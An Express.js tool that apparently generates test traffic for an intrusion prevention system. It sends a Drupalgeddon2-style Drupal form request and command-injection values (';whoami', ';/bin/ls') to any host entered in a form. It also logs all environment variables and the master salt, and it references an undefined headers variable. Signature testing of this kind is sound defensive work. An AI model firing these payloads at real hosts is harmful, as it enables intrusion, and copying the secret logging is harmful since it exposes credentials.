'use strict';

const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const qs = require('qs');
const path = require('path');
const crypto = require('crypto');
const app = express();
const PORT = 8081;
const HOST = '0.0.0.0'

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("views"));

axios.defaults.headers.post['Content-Type'] = 'application/x-www-form-urlencoded';

var masterSalt = "";
masterSalt=process.env.MASTER_SALT;
console.log(process.env);
console.log("MS " + masterSalt);

var dataCh1 = "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]="
var dataCh21 = qs.stringify({
	name: ';/bin/ls'
});
var dataCh22 = qs.stringify({
	name: ';whoami '
});

app.get('/*',(req, res) => {
	res.sendFile(path.join(__dirname, 'views/form.html'));
});

app.post('/attack',(req, res) => {
	const attck = req.body.host;
	const codeSalt = req.body.salt;
	const challenge = req.body.radio;

	console.log('Host: '+ attck);
	console.log('CodeSalt ' + codeSalt);
	console.log('MasterSalt: ' + masterSalt);
	console.log('Challenge: '+ challenge);

	var hash = crypto.createHash('sha256').update(codeSalt+masterSalt).digest('base64');
	console.log('Hash ' + hash);
	if(challenge == "1") {
		axios.post(
			'http://' + attck + ':8080/user/register?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax',
			dataCh1 + hash,
			headersCh
		).then(function (response) {
			console.log('Response:' + response);
		}).catch(function (error) {
			console.log(error);
		});

	} else if (challenge == "2"){
		axios.post(
			'http://' + attck + ':8888/ping.php',
			dataCh22 + hash,
			headersCh
		).then(function (response) {
			console.log(response);
		})
		.catch(function (error) {
			console.log(error);
		});
	} else {
                console.log("Challenge number is not valid." + challenge);
        }
	res.setHeader("Refresh", "7;url=/")
	res.send('Check your IPS module for trigger!')
});
app.listen(PORT, function () {
	console.log(`Tester application listening at ${HOST}:${PORT}`)
})
